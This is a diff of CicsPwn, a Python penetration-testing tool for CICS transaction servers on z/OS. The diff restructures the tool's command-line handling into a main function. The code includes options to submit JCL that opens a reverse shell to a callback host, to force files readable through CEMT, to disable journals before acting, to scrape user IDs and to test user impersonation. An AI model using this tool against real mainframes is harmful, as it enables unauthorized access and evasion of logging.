@@ -17,14 +17,15 @@ SLEEP = 0.5
 AUTHENTICATED = False
 DO_AUTHENT = False
 
-# Write a CICS SHELL in COBOL
-# Distinguish VTAM authentication from CICS authentication
-# Change variable names
-# Add space automatically
-# Beautify the code...
-# Handle errors
-# Document the code
-#
+# To do:
+#   Write a CICS SHELL in COBOL
+#   Distinguish VTAM authentication from CICS authentication
+#   Change variable names
+#   Add space automatically to requests
+#   Beautify the code...
+#   Handle errors
+#   Document the code
+
 
 class bcolors:
     HEADER = '\033[95m'
@@ -52,31 +53,6 @@ def signal_handler(signal, frame):
         print 'Done !'
         sys.exit(0)
 
-signal.signal(signal.SIGINT, signal_handler)
-
-parser = argparse.ArgumentParser(description='CicsPwn: a tool to pentest CICS transaction servers on z/OS')
-parser.add_argument('IP',help='The z/OS Mainframe IP or Hostname')
-parser.add_argument('PORT',help='CICS/VTAM server Port')
-parser.add_argument('-a','--applid',help='CICS ApplID on VTAM, default is CICS',default="CICS",dest='applid')
-
-parser.add_argument('-i','--info',help='Gather information about a CICS region',action='store_true',default=False,dest='info')
-parser.add_argument('-t','--trans',help='Get all installed transactions on a CICS TS server',action='store_true', default=False, dest='trans')
-parser.add_argument('-f','--files',help='List all installed files a on TS CICS',action='store_true',default=False,dest='files')
-parser.add_argument('-p','--pattern',help='Specify a pattern of a files/transaction to get (default is "*")',default="*",dest='pattern')
-parser.add_argument('-U','--userid',help='Specify a userid to use on CICS',dest='userid')
-parser.add_argument('-P','--password',help='Specify a password for the userid',dest='password')
-parser.add_argument('--get-file',help='Get the content of a file. It attempts to change the status of the file if it\'s not enabled, opened or readable',dest='filename')
-parser.add_argument('--enable-trans',help='Enable a single transaction ',dest='ena_trans')
-parser.add_argument('-q','--quiet',help='Remove Trailing and journal before performing any action',action='store_true',default=False,dest='journal')
-parser.add_argument('-u','--userids',help='Scrape userids found in different menus',action='store_true',default=False,dest='userids')
-parser.add_argument('-g','--surrogat',help='Checks wether you can impersonate another user when submitting a job', default=False,dest='surrogat_user')
-parser.add_argument('-s','--submit',help='Submit JCL to CICS server. Specify: dummy,reverse,custom (need -j option),cicsshell',dest='submit')
-parser.add_argument('--queue',help='Provides the name of the TD queue to submit a JOB',dest='queue')
-
-parser.add_argument('-l','--lhost',help='Remote server to call back to for reverse shell (host:port)',dest='lhost')
-parser.add_argument('-j','--jcl',help='Custom JCL file to provide',dest='jcl')
-
-results = parser.parse_args() 
 
 def show_screen():
     data = em.screen_get();
@@ -398,9 +374,9 @@ def get_infos():
         em.send_pf3();    
     
     if spool and ceci:
-        whine('Access to internal spool is apparently available','good',1);
+        whine('Access to the internal spool is apparently available','good',1);
                 
-    if (tdqueue or tdqueue2) and ceci:
+    if (tdqueue !="*" or tdqueue2 !="*") and ceci:
         whine('Transiant queue to access spool is apparently available','good',1);
         whine('When submitting a job with TDQueue, provide the option --queue='+(tdqueue.strip('\n') if tdqueue else tdqueue2.strip('\n')),'good',2);
        
@@ -567,7 +543,7 @@ def get_file_content():
     else:
         whine("File "+results.filename+" is lacking attributes to be readable. Changing that via CEMT", 'info')
         em.move_to(1,2);
-        request = 'CEMT Set READ FI('+filename.upper()+') OPE ENA                           '
+        request = 'Set READ FI('+filename.upper()+') OPE ENA                           '
         em.safe_send(request)
         em.send_enter()
         data = em.screen_get();
@@ -918,7 +894,7 @@ def submit_job(kind,lhost="192.168.1.28:4444"):
         jcl = reverse_jcl(lhost)
         
     token = open_spool();
-    token = None
+    #token = None
     if token:
         spool_write(token, jcl)
         close_spool()
@@ -1009,151 +985,92 @@ def check_surrogat(surrogat_user):
     else:
         whine('You cannot impersonate '+surrogat_user,'err',0);
 
-# Even if we define a TDQ pointing towards INTRDR, we need a valid DD INTRDR in the JCL Startup CICS
-#
-#~ def activate_tdq():
-    #~ if (send_cics('CEMT INQUIRE TDQueue (IRDR)',False)):
-        #~ send_cics('Set TDQueue (IRDR) OPE ENA',False)
-        #~ em.send_pf3();
-        #~ whine('TDQueue IRDR is enabled and opened','good')
-        #~ sys.exit();
-    #~ else:
-        #~ em.send_pf3();
-        #~ em.move_to(1,2)
-        #~ request = "CEDA DEF TD(IRDR) G(R5)                                                             "
-        #~ em.safe_send(request)
-        #~ em.send_enter();
-        #~ 
-        #~ em.move_to(7,22)
-        #~ em.safe_send("Extra")
-        #~ 
-        #~ em.move_to(9,22)
-        #~ em.safe_send("1")
-        #~ em.move_to(10,22)
-        #~ em.safe_send("INTRDR")
-        #~ 
-        #~ em.move_to(16,22)
-        #~ em.safe_send("Output")
-        #~ em.move_to(17,22)
-        #~ em.safe_send("80")
-        em.move_to(18,22)
-        em.safe_send("80")
-        #~ 
-        #~ em.move_to(19,22)
-        #~ em.safe_send('F')
-        #~ 
-        #~ em.move_to(20,22)
-        #~ em.safe_send('Unblocked')
-        #~ 
-      #~ 
-        #~ em.send_enter();
-        #~ 
-        #~ data = em.screen_get();
-        #~ 
-        #~ if "DEFINE SUCCESSFUL" in data[22]:
-            #~ whine("TDQueue IRDR, Group R2 defined successfully",'good',1)
-        #~ elif "Object already exists" in data[20]:
-            #~ whine("TDQueue IRDR, Group R2 already defined",'good',1)
-        #~ else:
-            #~ whine("Could not define TDQueue for some reason, make sure CEDA is available",'err')
-            #~ sys.exit();
-                        #~ 
-        #~ em.move_to(1,2)
-        #~ request = "INSTALL TDQueue(IRDR) Group(R5)"
-        #~ em.safe_send(request+"                                                 ")
-        #~ em.send_enter();
-        #~ 
-        #~ data = em.screen_get();
-        #~ if "INSTALL SUCCESSFUL" in data[22]:
-             #~ whine("TDQueue IRDR, Group R2 installed successfully",'good',1)        
-        #~ elif "already exists" in data[20]:
-            #~ whine("TDQueue IRDR, Group R2 already installed",'good',1)
-    
-# Some basic checks
-if (results.submit and (results.lhost == None or len(results.lhost.split(":")) < 2) and not results.jcl):
-    whine('You must specify a connect back address with the option --lhost <LHOST:PORT> ','err')
-    sys.exit();
-  
-             
-em = WrappedEmulator(False)
-connect_zOS(em, results.IP+":"+results.PORT)
+def main(results):
+    global DO_AUTHENT
+    global AUTHENTICATED
 
-if (results.userid != None and results.password !=None):
-   
-   DO_AUTHENT = True
-   data = em.screen_get()   
-   pos_pass=1;
-   logon_screen=False
-   
-   for d in data:
-     if "Password" in d or "Code" in d:
-       logon_screen=True
-       break
-     else:
-       pos_pass +=1
-   if logon_screen:
-       do_authenticate(results.userid, results.password, pos_pass)
-       whine("Successful authentication", 'info')
-       AUTHENTICATED = True;
+    if (results.submit and (results.lhost == None or len(results.lhost.split(":")) < 2) and not results.jcl):
+        whine('You must specify a connect back address with the option --lhost <LHOST:PORT> ','err')
+        sys.exit();      
 
-# Checking if APPLID provided is valid
-if not check_valid_applid(results.applid, DO_AUTHENT):
-    whine("Applid "+results.applid+" not valid, try again maybe it's a network lag", "err")
-    sys.exit();
+    if (results.userid != None and results.password !=None):
+       
+       DO_AUTHENT = True
+       data = em.screen_get()   
+       pos_pass=1;
+       logon_screen=False
+       
+       for d in data:
+         if "Password" in d or "Code" in d:
+           logon_screen=True
+           break
+         else:
+           pos_pass +=1
+       if logon_screen:
+           do_authenticate(results.userid, results.password, pos_pass)
+           whine("Successful authentication", 'info')
+           AUTHENTICATED = True;
 
-if results.info:
-    whine("Getting information about CICS server (APPLID: "+results.applid+")", 'info')
-    get_infos();
-
-elif results.trans:
-    if len(results.pattern) > 4:
-       whine('Transaction ID cannot be over 4 characters, ID will be truncated','err')
-    if len(results.pattern) < 4 and "*" not in results.pattern:
-       results.pattern +="****"
-     
-    transid = results.pattern[:4]
-    whine("Getting all transactions that match "+transid, 'info')
-    get_transactions(transid);
-    
-elif results.files:
-    if len(results.pattern) > 8:
-        whine('Filename cannot be over 8 characters, Name will be truncated','err')
-    if len(results.pattern) < 8 and "*" not in results.pattern:
-       results.pattern +="********"
-     
-    filename = results.pattern[:8]    
-    
-    whine("Getting all files that match "+filename, 'info')
-    get_files(filename);
-    
-elif results.filename:
-    whine("Getting Attributes of file "+results.filename, 'info')
-    get_file_content();
-
-elif results.ena_trans:
-    whine("Activating the transaction "+results.ena_trans, 'info')
-    if len(results.ena_trans) != 4:
-        whine("Transaction ID has to be 4 characters long "+results.ena_trans, 'err')
+    # Checking if APPLID provided is valid
+    if not check_valid_applid(results.applid, DO_AUTHENT):
+        whine("Applid "+results.applid+" not valid, try again maybe it's a network lag", "err")
         sys.exit();
+
+    if results.info:
+        whine("Getting information about CICS server (APPLID: "+results.applid+")", 'info')
+        get_infos();
+
+    elif results.trans:
+        if len(results.pattern) > 4:
+           whine('Transaction ID cannot be over 4 characters, ID will be truncated','err')
+        if len(results.pattern) < 4 and "*" not in results.pattern:
+           results.pattern +="****"
+         
+        transid = results.pattern[:4]
+        whine("Getting all transactions that match "+transid, 'info')
+        get_transactions(transid);
         
-    activate_transaction(results.ena_trans);
-    
-elif results.submit:
-    submit_job(results.submit,results.lhost);
+    elif results.files:
+        if len(results.pattern) > 8:
+            whine('Filename cannot be over 8 characters, Name will be truncated','err')
+        if len(results.pattern) < 8 and "*" not in results.pattern:
+           results.pattern +="********"
+         
+        filename = results.pattern[:8]    
+        
+        whine("Getting all files that match "+filename, 'info')
+        get_files(filename);
+        
+    elif results.filename:
+        whine("Getting Attributes of file "+results.filename, 'info')
+        get_file_content();
 
-elif results.journal:
-    whine("Disabling journal before moving on", 'info')
-    disable_journal();
+    elif results.ena_trans:
+        whine("Activating the transaction "+results.ena_trans, 'info')
+        if len(results.ena_trans) != 4:
+            whine("Transaction ID has to be 4 characters long "+results.ena_trans, 'err')
+            sys.exit();
+            
+        activate_transaction(results.ena_trans);
+        
+    elif results.submit:
+        submit_job(results.submit,results.lhost);
 
-elif results.userids:
-    whine("Scraping userids from different menus", 'info')
-    fetch_userids();
+    elif results.journal:
+        whine("Disabling journal before moving on", 'info')
+        disable_journal();
+
+    elif results.userids:
+        whine("Scraping userids from different menus", 'info')
+        fetch_userids();
+        
+    elif results.surrogat_user:
+        whine("Checking whether you can impersonate Userid "+results.surrogat_user, 'info')
+        check_surrogat(results.surrogat_user)
     
-elif results.surrogat_user:
-    whine("Checking whether you can impersonate Userid "+results.surrogat_user, 'info')
-    check_surrogat(results.surrogat_user)
+    em.terminate()
     
-    
+# not used
 def check_VTAM(em):
 	whine('Checking ifactivate in VTAM',kind='info')
 	#Test command enabled in the session-level USS table ISTINCDT, should always work
@@ -1177,4 +1094,36 @@ def check_VTAM(em):
 		whine('VTAM interface detected',kind='info')
         return True
 
-em.terminate()
+
+if __name__ == "__main__" :
+    
+    signal.signal(signal.SIGINT, signal_handler)
+
+    parser = argparse.ArgumentParser(description='CicsPwn: a tool to pentest CICS transaction servers on z/OS')
+    parser.add_argument('IP',help='The z/OS Mainframe IP or Hostname')
+    parser.add_argument('PORT',help='CICS/VTAM server Port')
+    parser.add_argument('-a','--applid',help='CICS ApplID on VTAM, default is CICS',default="CICS",dest='applid')
+
+    parser.add_argument('-i','--info',help='Gather information about a CICS region',action='store_true',default=False,dest='info')
+    parser.add_argument('-t','--trans',help='Get all installed transactions on a CICS TS server',action='store_true', default=False, dest='trans')
+    parser.add_argument('-f','--files',help='List all installed files a on TS CICS',action='store_true',default=False,dest='files')
+    parser.add_argument('-p','--pattern',help='Specify a pattern of a files/transaction to get (default is "*")',default="*",dest='pattern')
+    parser.add_argument('-U','--userid',help='Specify a userid to use on CICS',dest='userid')
+    parser.add_argument('-P','--password',help='Specify a password for the userid',dest='password')
+    parser.add_argument('--get-file',help='Get the content of a file. It attempts to change the status of the file if it\'s not enabled, opened or readable',dest='filename')
+    parser.add_argument('--enable-trans',help='Enable a single transaction ',dest='ena_trans')
+    parser.add_argument('-q','--quiet',help='Remove Trailing and journal before performing any action',action='store_true',default=False,dest='journal')
+    parser.add_argument('-u','--userids',help='Scrape userids found in different menus',action='store_true',default=False,dest='userids')
+    parser.add_argument('-g','--surrogat',help='Checks wether you can impersonate another user when submitting a job', default=False,dest='surrogat_user')
+    parser.add_argument('-s','--submit',help='Submit JCL to CICS server. Specify: dummy,reverse,custom (need -j option),cicsshell',dest='submit')
+    parser.add_argument('--queue',help='Provides the name of the TD queue to submit a JOB',dest='queue')
+
+    parser.add_argument('-l','--lhost',help='Remote server to call back to for reverse shell (host:port)',dest='lhost')
+    parser.add_argument('-j','--jcl',help='Custom JCL file to provide',dest='jcl')
+
+    results = parser.parse_args()
+    
+    em = WrappedEmulator(False)
+    connect_zOS(em, results.IP+":"+results.PORT)
+    
+    main(results)
